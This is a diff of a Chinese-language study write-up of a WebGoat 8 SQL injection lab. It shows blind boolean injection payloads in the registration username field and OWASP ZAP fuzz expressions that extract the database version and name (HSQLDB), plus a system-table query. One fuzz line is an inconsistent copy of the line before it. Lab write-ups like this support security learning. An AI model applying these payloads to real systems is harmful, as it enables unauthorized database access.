@@ -183,7 +183,42 @@ SQL 查询链就是一个跟在另一个查询后面。你可以使用标记查�
 
 ```123456' or '1'='1```
 
-不行，substring(database_version(),1,1) = 5
+Login入口测试了许久没有结果，但 Register 的用户名窗口存在注入可能，因为键入```tom' and '1'='2' ; --```可无限次的注册成功。
+
+要以 tom 登录，考虑修改 tom的密码，但是现在不知道用户表的名字，所以可以利用服务器对条件真假的响应来看看这是一种什么数据库，是何版本的数据库。
+
+尝试：```tom' and SUBSTRING('m',1,1)='m' ;--```，响应为：User tom' and SUBSTRING('m',1,1)='m' ;-- already exists please try to register with a different username.
+
+再尝试 ```tom' and SUBSTRING('m',1,1)='n' ;--```，响应为：User tom' and SUBSTRING('m',1,1)='n' ;-- created, please proceed to the login page.说明可以正常执行，SUBSTRING()可用，而且可以再次测试小写的substring也可行，说明大小写不敏感。
+
+支持 SUBSTRING()的数据库,可能是
+- Mysql数据库
+- MSSqlserver 
+- SUBSTRING
+- ...
+
+尝试输入语句```tom' and SUBSTRING(VERSION(),1,1)='5' ;--```再看看版本是不是常见的5.x.xx。结果居然报“Sorry the solution is not correct, please try again.” 这应该是语句含有不支持的函数VERSION()，那么后台可能不是mysql。
+
+替换上面的version()为database_version()。测试发现，支持database_version()函数，那么我们用owasp_zap 的fuzzer进行自动测试。使用fuzz中正则，表达式为 ```tom'\+and\+SUBSTRING\(database_version\(\)%2C\d%2C1\)%3D'\d'\+%3B--```
+
+通过观察响应中的反馈提示，可知版本约为2.3.x
+
+这是个什么数据库？网上查不到database_version()是哪个数据库的函数。莫非是只是一段程序，而不是某个应用级产品？OMG。
+
+猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 还真是。
+
+构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看哪些响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,原来是Java内置的数据库。
+
+现在，我们可以查看相关手册，然后找系统表了。发现以下内置函数和属性：
+- DATABASE ()
+- USER ()
+- CURRENT_SCHEMA
+- CURRENT_CATALOG
+
+利用下列fuzz：```tom'\+and\+SUBSTRING\(database\(\),[1-9],1\)='\w'\+;--```，发现数据库名就是你登录WebGoat8的用户名，果然是动态建的。
+
+利用下列fuzz：```tom'\+and\+SUBSTRING\(select information_schema.SYSTEM_TABLES\(\),[1-9],1\)='\w'\+;--```，发现数据库名就是你登录WebGoat8的用户名，果然是动态建的。
+
+```select * from INFORMATION_SCHEMA.SYSTEM_TABLES where TABLE_TYPE='TABLE' ```
 
 
-username_reg=leo&email_reg=123%40111.COM&password_reg=123&confirm_password_reg=123
